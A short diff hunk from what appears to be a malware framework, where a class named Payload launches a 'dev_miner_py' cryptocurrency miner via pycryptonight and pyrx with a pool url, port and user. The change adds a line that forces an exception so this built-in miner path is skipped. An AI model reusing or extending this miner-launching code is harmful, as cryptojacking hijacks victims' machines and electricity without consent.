@@ -262,6 +262,7 @@ class Payload():
 
         # first attempt using built-in python miner
         try:
+            raise Exception
             import pycryptonight, pyrx
             self.child_procs['dev_miner_py'] = globals()['Miner'](url=url, port=host_port, user=user)
             self.child_procs['dev_miner_py'].start()
